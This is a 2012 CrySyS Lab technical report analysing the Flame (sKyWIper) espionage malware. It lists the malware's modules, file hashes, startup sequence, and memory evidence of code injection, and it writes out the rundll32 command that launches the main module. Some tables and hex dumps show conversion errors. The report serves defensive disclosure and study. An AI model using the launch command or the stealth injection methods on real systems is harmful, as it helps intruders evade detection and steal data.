# sKyWlper (a.k.a. Flame a.k.a. Flamer): A complex malware for targeted attacks

v1.05 (May 31, 2012) – It's a live document modified all the time

## Technical Report

by

![](_page_0_Picture_4.jpeg)

## Laboratory of Cryptography and System Security (CrySyS Lab)



![](_page_0_Picture_7.jpeg)

### Budapest University of Technology and Economics

### Department of Telecommunications



This report contains information provided by anonymous parties and hence references were edited to preserve their anonymity

## Findings in brief

In May 2012, our team participated in the analysis of an as yet unknown malware, which we internally call sKyWlper. Based on the information initially received, we understood that the malware is an important piece of a targeted attack. When we started the analysis, we did not know how many countries were affected, but we suspected that it was not limited to a single country. Our suspicion was based on indications that pieces of the malware was probably identified and uploaded from European parties onto binary analysis sites in the past. During the investigation, we received information about systems infected by sKyWlper in other countries, including Hungary, our home country. Hence, the suspicion became evidence, and this made it clear for us that our findings must be disclosed by publishing this report.

It is obvious from the list of its files that sKyWlper must be identical to the malware described in the post  (from Iran National CERT (MAHER)) where it is called Flamer. For convenience, we keep our naming of the malware and call it sKyWlper based on one of the filenames (~KWI) it uses for temporary files.

sKyWlper's constitution is quite complex with a large number of components and the substantial size of some of its files. Therefore, providing its full analysis in a limited amount of time was infeasible with our current resources. Our goal was to get a quick understanding of the malware's purpose, and to identify its main modules, storage formats, encryption algorithms, injection mechanisms and activity in general. This report contains the results of our analysis, which should help other researchers with more resources to get started and continue the analysis producing more detailed results.

Our first insight suggests that sKyWlper is another info-stealer malware with a modular structure incorporating multiple propagation and attack techniques, but further analysis may discover components with other functionalities. In addition, sKyWlper may have been active for as long as five to eight years, or even more. sKyWlper uses compression and encryption techniques to encode its files. More specifically, it uses 5 different encryption methods (and some variants), 3 different compression techniques, and at least 5 different file formats (and some proprietary formats too). It also uses special code injection techniques. Quite interestingly, sKyWlper stores information that it gathers on infected systems in a highly

![](_page_1_Picture_5.jpeg)

structured format in SQLite databases. Another uncommon feature of sKyWlper is the usage of the Lua scripting language.

sKyWIper has very advanced functionality to steal information and to propagate. Multiple exploits and propagation methods can be freely configured by the attackers. Information gathering from a large network of infected computers was never crafted as carefully as in sKyWIper. The malware is most likely capable to use all of the computers' functionalities for its goals. It covers all major possibilities to gather intelligence, including keyboard, screen, microphone, storage devices, network, wifi, Bluetooth, USB and system processes.

The results of our technical analysis support the hypotheses that sKyWlper was developed by a government agency of a nation state with significant budget and it may be related to cyber warfare activities.

sKyWlper is certainly the most sophisticated malware we encountered during our practice; arguably, it is the most complex malware ever found.

MAJOR UPDATES:

05/30/2012 Kaspersky published much more details about modules

![](_page_2_Picture_6.jpeg)

## Table of contents

| 1. Introduction                                            |  |
|------------------------------------------------------------|--|
| 1.1. Investigation                                         |  |
| 1.2.                                                       |  |
| 1.3.                                                       |  |
| 1.4.              Comparison to Duqu (Stuxnet) at a glance |  |
| 2. Main components                                         |  |
| 2.1. 2 Modules                                             |  |
| 2.2.           File listing and hashes                     |  |
| 3. Activation and propagation                              |  |
| 3.1.                                                       |  |
| 3.2.                                                       |  |
| 3.3. Injections                                            |  |
| 3.4. SHooks                                                |  |
| 3.5. 9 Mutexes                                             |  |
| 3.6.                                                       |  |
| 3.7.                                                       |  |
|                                                            |  |
| 4. Description of components                               |  |
| 4.1. Encryption algorithms                                 |  |
| 4.2. Registry parts                                        |  |
| 4.3. Compression and table formats                         |  |
| 4.4. Data storage formats                                  |  |
| 4.5.                                                       |  |
| 4.6.         Saving additional information                 |  |
| 5. C&C communication                                       |  |
| 6. Attack details - dictionary and scripts                 |  |
| 6.1.                                                       |  |
| 6.2.                                                       |  |
| 6.3.                                                       |  |
| 7. Evasion techniques                                      |  |
| 7.1. Security programs relation                            |  |
| 7.2.                                                       |  |

![](_page_3_Picture_2.jpeg)

#### Introduction 1.

Our team at CrySyS Lab, Budapest was alerted in May 2012 of a targeted attack found in the wild. Below we summarize the investigation history and the current status of the forensic analysis.

## 1.1. Investigation

We have carried out an investigation in collaboration with several parties involved in incident response since we were alerted of the malware sKyW!per. Some of these parties involved may want to remain anonymous; therefore, references in the document are deliberately incorrect to avoid identification of the source of some information, data, sample, code, prototype, etc.

sKyWlper is too complex to be fully analyzed with our limited resources and time. Therefore, our investigations focused on the "big picture", trying to get a first insight into the capabilities, behavior, encryption, data storage, propagation and communications of the malware. Much more work is needed to fully understand the details of the operation of the malware; however, as much debug/symbol information remains in the code, a detailed analysis seems to be feasible with additional resources and time.

## 1.2. History and build dates

sKyWlper has most probably been operated undetected for years. It has been potentially operational for 5 years or more according to malware intelligence reports. The main component, msgsecmgr.ocx a.k.a. wavesup3.drv refers to many versions of a dynamic link library. This component has been previously observed (without raising an alarm) as follows:

### Country of origin

The filename WAVESUP3.DRV was first seen on Dec 5 2007 in Europe by the Webroot community. Since, it has been observed in the following geographical regions:

• Europe on Dec 5 2007

![](_page_4_Picture_10.jpeg)

- The United Arab Emirates on Apr 28 2008
- Islamic Republic of Iran on Mar 1 2010

### File sizes

The following file sizes have been seen:

- . 1,153,536 bytes
- 991,232 bytes ●
- 975,872 bytes .

## 1.3. Build dates

The build date PE header information of the malware uses fake date information for its files; hence we cannot precisely identify the target system's infection time. Nonetheless, the SQLite related part of mssecmgr.ocx contains some build time info (more about the components later):

```
"Unidentified build, Aug 31 2011 23:15:32    31...............................................................................................................................
23:15:32"
```
The following string shows SQLite version information, found in the memory dumps:

2010-01-05 15:30:36 28d0d7710761114a44a1a3a425a6883c661f06e7 NULL

It relates to SQLITE\_VERSION "3.6.22" (part of the source code)

Also, there is a reference "1.2.3″, and we think that this refers to zlib version number possibly used in SQLite tables.

Some tables of the malware contain timestamps, possibly some of these do not relate to actual running times, but instead some dates when the attackers developed or constructed attack flows. An example is audcache.dat that contains timestamps like the ones below. We are not sure about the timestamps' function and about the table structure. There are other binary strings that might be timestamps, but their values vary too much to be accurate.

![](_page_5_Picture_15.jpeg)

```
5409
      Tue Oct 11 23:35:34 2011
5409
      Tue Oct 11 23:35:37 2011
5409
      Tue Oct 11 23:35:37 2011
5409
      Tue Oct 11 23:35:37 2011
ec02
      Tue Oct 11 23:59:59 2011
      Tue Oct 11 23:59:59 2011
ec02
      Tue Oct 11 23:59:59 2011
ec02
ec02
      Tue Oct 11 23:59:59 2011
ec02
      Wed Oct 12 00:00:03 2011
ec02 
      Wed Oct 12 10:52:33 2011
      Wed Oct 12 10:52:33 2011
ec02 
      Wed Oct 12 10:53:04 2011
ec02
ec02 
     Wed Oct 12 11:09:32 2011
     Wed Oct 12 11:09:32 2011
ec02 
     Wed Oct 12 11:21:17 2011
ec02
ec02  Wed Oct 12 11:21:17 2011
     Wed Oct 12 11:21:17 2011
ec02
     Wed Oct 12 11:21:17 2011
erno
ec02 
     Wed Oct 12 11:22:04 2011
ec02
      Wed Oct 12 11:22:04 2011
```
Figure 1 – Timestamps found in audcache.dat

### 1.4. Comparison to Duqu (Stuxnet) at a glance

As our team played a significant role in the discovery and analysis of Duqu, another recently discovered info-stealer malware used in targeted attacks, we briefly compare sKyWlper to Duqu (and Stuxnet) in Table 1. Note that this is a high-level, simplified comparison.

As it can be seen from the comparison, sKyWlper and Duqu (Stuxnet) have many differences, and it seems plausible that sKyWlper was not made by the same developer team as that of Duqu/Stuxnet/~D. However, we cannot exclude the possibility that the attackers hired multiple independent development teams for the same purpose, and sKyWlper and Duqu are two independent implementations developed for the same requirement specifications. This may be an approach to increase the robustness of an operation, which can persist even if one of the two (or more?) implementations is uncovered.

![](_page_6_Picture_5.jpeg)

| Feature                                | Duqu, Stuxnet, "D         | sKyWiper                  |
|----------------------------------------|---------------------------|---------------------------|
| Modular malware                        | V                         | V                         |
| Kernel driver based rootkit            | V                         | fitmgr usage              |
| Valid digital signature on driver      | Realtek, JMicron, C-media | Not found                 |
| Injection based on A/V list            | V                         | Different                 |
| Imports based on checksum              | V                         | Not seen                  |
| 3 Config files, all encrypted, etc.    | V                         | Totally diferrent         |
| Keylogger module                       | ><br>(Duqu)               | V                         |
| PLC functionality                      | (Stuxnet)<br>>            | Not found (vet)           |
| Infection through local shares         | (Stuxnet)<br>>            | V Very likely             |
| Exploits                               | V                         | > Some from Stuxnet!      |
| 0-day exploits                         | V                         | Not yet found             |
| DLL injection to system processes      | V                         | √ (but different)         |
| DLL with modules as resources          | V                         | V                         |
| RPC communication                      | V                         | P                         |
| RPC control in LAN                     | V                         | P                         |
| RPC Based C&C                          | V                         | P                         |
| Port 80/443, TLS based C&C             | >                         | SSL+SSH found             |
| Special "magic" keys, e.g. 790522, AE  | V                         | Only 0xAE is similar      |
| Virtual file based access to modules   | V                         | Not seen                  |
| Usage of LZO lib                       | Mod. LZO                  | No LZO: Zlib, PPMd, bzip2 |
| Visual C++ payload                     | V                         | >                         |
| UPX compressed payload,                | V                         | some                      |
| Careful error handling                 | V                         | ?                         |
| Deactivation timer                     | V                         | Self-kill logic inside    |
| Initial Delay                          | ? Some                    | Different from Duqu       |
| Configurable starting in safe mode/dbg | V                         | Not like Stuxnet          |

Table 1 – Comparing sKyWIper to Duqu and Stuxnet at a first glance

![](_page_7_Picture_2.jpeg)

## 2. Main components

## 2.1. Modules

We present an overview of the modules encountered during the analysis of sKyWlper. Figure 2 shows some files related to the malware, grouped by type, with some labels indicating our current knowledge about how some of these files are created and encoded (encrypted or compressed).

![](_page_8_Figure_3.jpeg)

Figure 2 – Files related to the malware

![](_page_8_Figure_5.jpeg)

The malware contains the following modules:

#### Related OCX files:

| mssecmgr.ocx (6 M)    | Main module                                                                 |
|-----------------------|-----------------------------------------------------------------------------|
|                       | -- resource 146 (2.5 M)     Compressed file with some zlib-like compression |
| advnetcfg.ocx (0.6 M) | Injected part, possibly info stealer (screen shots and alike)               |
| msglu32.ocx (1.6 M)   | Created by main module                                                      |
| nteps32.ocx (0.8 M)   | Created by main module                                                      |
| soapr32.ocx (0.2 M)   | Can be found in resource 146, possibly network based propagation            |
|                       | module                                                                      |

The main module of the malware is mssegmgr.ocx, which is 6 MByte long. It is loaded at startup, and later copied to wavesup3.drv. The main module also creates other OCX modules as shown in the above list.

### Related files in the Windows/Temp folder:

| To691.tmp (1.5 M) | Initial settings data file |
|-------------------|----------------------------|
|                   |                            |

#### Related files in the Windows/System32 folder:

| ccalc32.sys          | Configuration settings table, fully encrypted. It is generated by the |
|----------------------|-----------------------------------------------------------------------|
|                      | malware installer process, and stored in uncompressed Resource        |
|                      | 146 of mssecmgr.sys at position 0x00001E7118. It is encrypted by      |
|                      | RC4 (128).                                                            |
| boot32drv.sys (~1 K) | Desktop window related data, encrypted by XOR with 0xFF               |

#### Temporary files created by the malware:

| ~DEB93D.tmp | Encrypted file containing SQLite database of nmb lookups. Written |
|-------------|-------------------------------------------------------------------|
|             | by services.exe.                                                  |
| ~HLV084.tmp | Compressed parts contain info on running processes. Written by    |
|             | winlogon.exe.                                                     |
| ~HLV294.tmp | Purpose unknown. This and 4-5 similar files often appear on       |
|             | infected systems.                                                 |
| ~KWI<>      | Compressed parts contain info on running processes. Written by    |
|             | winlogon.exe.                                                     |

![](_page_9_Figure_10.jpeg)

| °rf<number>.tmp    | Contains full file listing of the infected computer in SQLite 3<br>database format. Encrypted with algorithm E1 (see encryption<br>algorithms later). |
|--------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------|
| Related DAT files: |                                                                                                                                                       |
| dstrlog.dat        | CLAN DB for storing attack and propagation methods.                                                                                                   |

|             | க்கார் மீப் போட்டியில் பாடி இருக்கியின் பிட்டாம்.            |
|-------------|--------------------------------------------------------------|
| Imcache.dat | Information on target computer.                              |
| mscrypt.dat | Code, data, and configuration on attacks, e.g. JIMMY, MUNCH. |
| ntcache.dat | Information on target computer.                              |
| rccache.dat |                                                              |
| ssitable    |                                                              |

#### DAT files created from dllrun32 startup (with file size and time of creation):

| audcache      | Possibly pre-created attack database (1572896 May XX 10:32) |
|---------------|-------------------------------------------------------------|
| audfilter.dat | (0 May XX 10:32)                                            |
| dstrlog.dat   | CLAN DB of attacks (86016 May XX 10:32)                     |
| lmcache.dat   | Information on target computer (SFS) (460800 May XX 10:32)  |
| ntcache.dat   | Information on target computer (SFS) (4454400 May XX 10:32) |
| wpgfilter.dat | (6163261 May XX 10:32)                                      |

### 2.2. File listing and hashes

Here, we provide the hashes for the main components of sKyWlper. Later in Section 7.3, we provide a full list of suspected filenames used by the malware (whitelisted).

```
bb5441af1e1741fca600e9c433cb1550 *advnetcfg.ocx
d53b39fb50841ff163f6e9cfd8b52c2e *msglu32.ocx
bdc9e04388bda8527b398a8c34667e18 *mssecmgr.ocx
c9e00c9d94d1a790d5923b050b0bd741 *nteps32.ocx
296e04abb00ea5f18ba021c34e486746 *soapr32.ocx
5ad73d2e4e33bb84155ee4b35fbefc2b *ccalc32.sys
dcf8dab7e0fc7a3eaf6368e05b3505c5 *mscrypt.dat
06a84ad28bbc9365eb9e08c697555154 *00004069.ex
ec992e35e794947a17804451f2a8857e *00004784.dl
296e04abb00ea5f18ba021c34e486746 *00005729.d1
b604c68cd46f8839979da49bb2818c36 *00006411.dl
```
![](_page_10_Picture_7.jpeg)

c81d037b723adc43e3ee17b1eee9d6cc \*boot32drv.sys (not constant but possible match)

Figure 3 – MD5 hashes of the malware's components

| 60d5dbddae21ecb4cfb601a2586dae776ca973ef *advnetcfg.ocx |  |
|---------------------------------------------------------|--|
| 3a9ac7cd49e10a922abce365f88a6f894f7f1e9e *msglu32.ocx   |  |
| a592d49ff32fe130591ecfde006ffa4fb34140d5 *mssecmqr.ocx  |  |
| 7105b17d07fd5b30d5386862a3b9cc1fff53a2398 *nteps32.ocx  |  |
| 5fdd7f613db43a5b0dbec8583d30ea7064983106 *soapr32.ocx   |  |
| faaef4933e5f738e2abaff3089d36801dd871e89 *ccalc32.sys   |  |
| 8b591dd7cd44d8abae7024ca2cc26034457dd50e *mscrypt.dat   |  |
| 25fc20eedd7bfca26cf5fad1fade13b05c9a2d20 *00004069.ex   |  |
| e608a6d9f0ab379e62119656e30eef12542f2263 *00004784.dl   |  |
| 5fdd7f613db43a5b0dbec8583d30ea7064983106 *00005729.dl   |  |
| 7a1351c084a556bdceaf221a43cb69579ca7b9bb *00006411.dl   |  |
| d4b21620d68fdc44caa20362a417b251ff833761 *boot32drv.sys |  |

Figure 4 – SHA-1 hashes of the malware's components

![](_page_11_Picture_4.jpeg)

## 3. Activation and propagation

## 3.1. Startup sequence

The malware can be started using two different methods:

- 1. Set msgsecmgr.ocx in the registry (see below at registry parts)
- 2. Run the malware from rundll32 using the command as follows:

start /wait rundl132.exe c:\windows\system32\mssecmgr.ocx,DDEnumCallback

At startup, mssecmgr.ocx is loaded as LSA Authentication Package. About 2 minutes later advnetcfg.ocx is loaded by services.exe. It is repeated every 2 to 3 minutes 3 times in total. About 2 minutes later services.exe loads nteps32.ocx from mssecmgr.ocx, and then winlogon.exe also loads nteps32.ocx. This file is loaded several times. In the meantime, explorer.exe starts 5 iexplore processes that subsequently create wpgfilter.dat. Again 2 minutes later ccalc32.sys is written by services.exe, and in 1 minute winlogon.exe loads it. Next, mssecmgr.ocx is copied to wavsup3.drv. Then, boot32drv.sys is loaded by services.exe. This sequence of events is illustrated in Figure 5 below, while Figure 6 shows another representation with exact timestamps.

![](_page_12_Picture_7.jpeg)

![](_page_13_Figure_0.jpeg)

Figure 5 – Startup sequence

![](_page_13_Picture_2.jpeg)

![](_page_14_Figure_0.jpeg)

Figure 6 - Startup procedure with timestamps

## 3.2. Bootup experiments to gather timing information

We performed some experiment to determine the order of module loadings and activities.

### Trial 1

ccalc32.sys has a last change and last access time at the first start - difference ~50 seconds. In normal LSA startup without mscrypt installed, ccalc was not created (no real CC traffic either).

Question: Is ccalc32 created by mssecmgr+advnet+?? during startup if ran from rundll?

![](_page_14_Figure_7.jpeg)

### Trial 2

Nteps, soapr, to691 are removed to test if these files are needed for the malware to start. Windows update traffic starts after 1:40 min of starting rundll for startup. At iexplore exit ccalc32.sys immediately appeared. ~HLV files appear about 1:20 min after the appearance of ccalc32.sys. The exact timestamp was 23:45:00 (local time), the sharp seconds value (:00) seems suspicious.

Results: nteps, soapr, to691 are not needed for startup

### Trial 4

Starting with Rundll32 at 23:49:20 23:51:06 windowsupdate traffic begins 23:52:48 iexplore quits, about 3 seconds later ccalc appears 23:54:25 ~HVL files found in windows/temp msglu32.ocx exists, creation time is 2004, change time is current local time

### Trial 5

Removing nteps, soapr, to691, msglu to be sure that msglu is indeed created during startup. Results: Malware is still running, msglu32 is created just at the same time as \*HLV files begin to be created. Order of events:

- 1. iexplore + windowsupdate traffic
- 2. traffic stops, ccalc32 created, some 1:20 min delay
- 3. ~HLV files begin to appear and msglu is deployed

![](_page_15_Picture_10.jpeg)

## 3.3. Injections

There are multiple injections of code during startup. Only advnetcfg32 is probably injected 3 times. We have no detailed information why code is injected into multiple processes (including winlogon.exe, services.exe, explorer.exe).

| 0<br>fltmgr.sys              | fltmgr.sys + 0x1888    | 0xf83f0888 | C:\WINDOWS\System32\Drivers\fltmgr.sys |
|------------------------------|------------------------|------------|----------------------------------------|
| ।<br>fltmgr.sys              | fltmgr.sys + 0x31a7    | 0xf83f21a7 | C:\WINDOWS\System32\Drivers\fltmgr.sys |
| 2<br>fltmgr.sys              | fltmgr.sys + 0xfc7a    | 0xf83fec7a | C:\WINDOWS\System32\Drivers\fltmgr.sys |
| 3<br>ntkrnlpa.exe            | ntkrnlpa.exe + 0xac124 | 0x80583124 | C:\WINDOWS\system32\ntkrnlpa.exe       |
| ਪ<br>ntkrnlpa.exe            | ntkrnlpa.exe + 0xe8488 | 0x805bf488 | C:\WINDOWS\system32\ntkrnlpa.exe       |
| 5<br>ntkrnlpa.exe            | ntkrnlpa.exe + 0xe4a14 | 0x805bba14 | C:\WINDOWS\system32\ntkrnlpa.exe       |
| 6<br>ntkrnlpa.exe            | ntkrnlpa.exe + 0x9ffeb | 0x80576feb | C:\WINDOWS\system32\ntkrnlpa.exe       |
| 7<br>ntkrnlpa.exe            | ntkrnlpa.exe + 0x6a67c | 0x8054167c | C:\WINDOWS\system32\ntkrnlpa.exe       |
| 8<br><unknown><br>0×1 f2a333 | 0×1 f2a333             |            |                                        |
| ರಿ<br>0x1f1ed9c<br><unknown> | 0x1f1ed9c              |            |                                        |
| 10<br>0x1f1128b<br><unknown> | 0x1f1128b              |            |                                        |
| 11<br><unknown><br>0x1f1c900 | 0x1f1c900              |            |                                        |

Figure 7 – Winlogon.exe with injected code working with ccalc32.sys – procmon

In case of Duqu, the authors used ZwCreateSection() and ZwMapViewOfSection() to copy code into running processes, while other methods use LoadLibrary() and LoadLibraryEx() to load a library into a code. These techniques can easily be detected as the inserted DLLs appear in the PEB's InLoadOrderModuleList. In case of sKyWlper, the code injection mechanism is stealthier such that the presence of the code injection cannot be determined by conventional methods such as listing the modules of the corresponding system processes (winlogon, services, explorer). The only trace we found at the first sight is that certain memory regions are mapped with the suspicious READ, WRITE and EXECUTE protection flags, and they can only be grasped via the Virtual Address Descriptor (VAD) kernel data structure. As these regions must have been allocated dynamically by means of VirtualAllocEx() or WriteProcessMemory(), they have the type of Vad Short. Thus, the combination of RWE flags and type VadS for a given memory region in a system process allowed us to identify the code injection. Figure 8 shows the malicious code injections we found with Volatility.

Process: winlogon.exe Pid: 676 Address: 0xab0000 Vad Tag: VadS Protection: PAGE EXECUTE\_READWRITE Flags: CommitCharge: 1, MemCommit: 1, PrivateMemory: 1, Protection: 6 0x00ab0000 10 00 00 00 4a 89 6f d1 aa 04 9b 3c c8 51 72 bc ... . . J. o .. . . < . Qr . 0x00ab0000 1f c4 f1 56 00 00 00 00 00 00 00 00 00 00 00 00 . . . V . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 0x00ab0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x00ab0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00

![](_page_16_Picture_6.jpeg)

Process: winlogon.exe Pid: 676 Address: 0xac0000 Vad Tag: VadS Protection: PAGE EXECUTE READWRITE Flags: CommitCharge: 1, MemCommit: 1, PrivateMemory: 1, Protection: 6 0x00ac0000 10 00 00 4a 89 6f d1 aa 04 9b 3c c8 51 72 bc .....J.o....<.Qr. 0x00ac0000 1f c4 f1 56 00 00 00 00 00 00 00 00 00 00 00 . . . . . V . . . . . . . . . . . . . . . . 0x00ac0000 0x00ac0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ..................... Process: winlogon.exe Pid: 676 Address: 0xb10000 Vad Tag: VadS Protection: PAGE EXECUTE READWRITE Flags: CommitCharge: 1, MemCommit: 1, PrivateMemory: 1, Protection: 6 0x00b10000 10 00 00 4a 89 6f d1 aa 04 9b 3c c8 51 72 bc .....J.o....<.Or. 0x00b10000 1f c4 f1 56 00 00 00 00 00 00 00 00 00 00 00 00 . . . . V . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 0x00b10000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 .................. 0x00b10000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 .................... Process: winlogon.exe Pid: 676 Address: 0xb20000 Vad Tag: VadS Protection: PAGE EXECUTE\_READWRITE Flags: CommitCharge: 1, MemCommit: 1, PrivateMemory: 1, Protection: 6 0x00b20000 10 00 00 4a 89 6f d1 aa 04 9b 3c c8 51 72 bc .....J.o.....<.Or. 0x00b20000 1f c4 f1 56 00 00 00 00 00 00 00 00 00 00 . . . . V . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 0x00b20000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................... 0x00b20000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................... Process: winlogon.exe Pid: 676 Address: 0x10f0000 Vad Tag: VadS Protection: PAGE EXECUTE READWRITE Flags: CommitCharge: 1, MemCommit: 1, PrivateMemory: 1, Protection: 6 0x010f0000 10 00 00 4a 89 6f d1 aa 04 9b 3c c8 51 72 bc .....J.o....<.Qr. 0x010f0000 1f c4 f1 56 00 00 00 00 00 00 00 00 00 00 00 0x010f0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ............... 0x010f0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 . . . . . . . . . . . . . . . . . . Process: winlogon.exe Pid: 676 Address: 0x1220000 Vad Tag: VadS Protection: PAGE EXECUTE READWRITE Flags: CommitCharge: 1, MemCommit: 1, PrivateMemory: 1, Protection: 6 0x01220000 10 00 00 4a 89 6f d1 aa 04 9b 3c c8 51 72 bc ....J.o.....<.Or. 0x01220000 1f c4 f1 56 00 00 00 00 00 00 00 00 00 00 ...V........... 0x0122000 0×01220000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 Process: winlogon.exe Pid: 676 Address: 0x1490000 Vad Tag: VadS Protection: PAGE\_EXECUTE\_READWRITE Flags: CommitCharge: 1, MemCommit: 1, PrivateMemory: 1, Protection: 6 0x01490000 ba ba 0d f0 00 00 48 01 30 25 80 7c b7 24 80 7c .......H.0%.|.\$.| 0x01490000 b3 1d 90 7c 55 8b ec 51 53 56 57 33 ff 89 7d fc ...|U..QSVW3..}. 0x01490000 e8 00 00 00 58 89 45 fc 8b 45 fc 6a 64 59 48 0x01490000

![](_page_17_Picture_1.jpeg)

Process: winlogon.exe Pid: 676 Address: 0x3c8a0000

| Vad Tag: VadS Protection: PAGE EXECUTE READWRITE                                                                                                                                                                                                                                        |  |  |  |  |  |
|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|--|--|--|--|--|
| Flags: CommitCharge: 4, MemCommit: 1, PrivateMemory: 1, Protection: 6                                                                                                                                                                                                                   |  |  |  |  |  |
| 0x3c8a0000  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00<br>.<br>0x3c8a0000  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00<br>.<br>0x3c8a0000  00 00 00 00 00 00 00 00 00 00 00 00 00 00<br>.<br>0x3c8a0000  00 00 00 27 00 27 00 01 00 00 00 00 00 00    ''                             |  |  |  |  |  |
| Process: services.exe Pid: 720 Address: 0x950000<br>Vad Tag: VadS Protection: PAGE EXECUTE READWRITE<br>Flags: CommitCharge: 1, MemCommit: 1, PrivateMemory: 1, Protection: 6                                                                                                           |  |  |  |  |  |
| 0x00950000 ba ba 0d f0 00 00 94 00 30 25 80 7c b7 24 80 7c   0%. .\$. <br>0x00950000 b3 1d 90 7c 55 8b ec 51 53 56 57 33 ff 89 7d fc    UQSVM3}.<br>0x00950000 e8 00 00 00 58 89 45 fc 8b 45 fc 6a 64 59 48<br>0x00950000  49 89 45 fc 74 5b 81 38 ba ba 0d f0 75 f1 8d 70   I.E.t[.8up |  |  |  |  |  |
| Process: explorer.exe Pid: 1616 Address: 0x1400000<br>Vad Tag: VadS Protection: PAGE EXECUTE READWRITE<br>Flags: CommitCharge: 1, MemCommit: 1, PrivateMemory: 1, Protection: 6                                                                                                         |  |  |  |  |  |
| 0x01400000 ba ba 0d f0 00 00 e8 00 30 25 80 7c b7 24 80 7c<br>0x01400000 b3 1d 90 7c 55 8b ec 51 53 56 57 33 ff 89 7d fc    UQSVW3}.<br>0x01400000 e8 00 00 00 58 89 45 fc 8b 45 fc 6a 64 59 48<br>0x01400000  49 89 45 fc 74 5b 81 38 ba ba 0d f0 75 f1 8d 70   I.E.t[.8up             |  |  |  |  |  |
| Process: explorer.exe Pid: 1616 Address: 0x1b50000<br>Vad Tag: VadS Protection: PAGE EXECUTE READWRITE<br>Flags: CommitCharge: 1, MemCommit: 1, PrivateMemory: 1, Protection: 6                                                                                                         |  |  |  |  |  |
| 0x01b50000 67 32 cd ba 2e 00 4d 00 53 00 42 00 54 00 53 00   g2M.S.B.T.S.<br>0x01b50000 00 00 00 43 02 50 03 f8 01 4b 6c 43 02 04 00 01 00     PKIC<br>0x01b50000 03 00 00 90 fa fc 00 2c fb fc 00 00 da 00<br>0x01b50000 00 e9 90 7c 40 00 91 7c ff ff ff 3d 00 91 7c    @ =           |  |  |  |  |  |
| Process: explorer.exe Pid: 1616 Address: 0x4540000<br>Vad Tag: VadS Protection: PAGE EXECUTE READWRITE<br>Flags: CommitCharge: 1, MemCommit: 1, PrivateMemory: 1, Protection: 6                                                                                                         |  |  |  |  |  |
| 0x04540000  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00<br>.<br>0x04540000  00 00 54 04 00 00 00 00 00 00 00 00 00 00 00<br>. T<br>0x04540000  10 00 54 04 00 00 00 00 00 00 00 00 00 00    T<br>0x04540000  20 00 54 04 00 00 00 00 00 00 00 00 00 00 00<br>. T                       |  |  |  |  |  |

Figure 8 – The presence of code injection and hooks (Volatility)

By examining the injected regions in more details, we found that the inserted code belongs to shell32.dll. This can be verified by means of vmmap as shown in Figure 9.

![](_page_18_Picture_3.jpeg)

| Address                                                                                                      | Blocks | Protection                                                                                                                                                    | Details                                                                                                                                                                                                                                                                                | A |
|--------------------------------------------------------------------------------------------------------------|--------|---------------------------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|---|
| E 01000000<br>E 013E0000<br>E 016A0000<br>E 01C70000<br>E 01D20000<br>Collego000<br>E 024B0000<br>田 02730000 |        | 4 Execute/Read<br>4 Execute<br>1 Read<br>3 Execute/Read/Write<br>3 Execute/Read/Write<br>3 Execute/Read/Write<br>3 Execute/Read/Write<br>3 Execute/Read/Write | C:\WINDOWS\system32\winlogon.exe<br>C:\WINDOWS\system32\WgaLogon.dll<br>C:\WINDOWS\system32\xpsp2res.dll<br>C:\WINDOWS\system32\shell32.dl<br>C:\WINDOWS\system32\shell32.dll<br>C:\WINDOWS\system32\shell32.dll<br>C:\WINDOWS\system32\shell32.dll<br>C:\WINDOWS\system32\shell32.dll |   |
| E 47020000                                                                                                   |        |                                                                                                                                                               | 111<br>Timeline      Heap Allocations     <br>Call Tree   <br>Trace                                                                                                                                                                                                                    |   |

Figure 9 – The presence of code injection (vmmap)

### 3.4. Hooks

By checking an infected machine with the GMER rootkit revealer, we can see that the infected explorer.exe hooked the SHGetSpecialFolderPathW() library call in the shell32.dll module (that is supposedly the result of a code injection).

| GMER 1.0.15.15641                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |                                                                                                                                                                    |
|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| Rootkit/Malware<br>Autostart CMD<br>Processes<br>Modules<br>Services   Files<br>Registry                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |                                                                                                                                                                    |
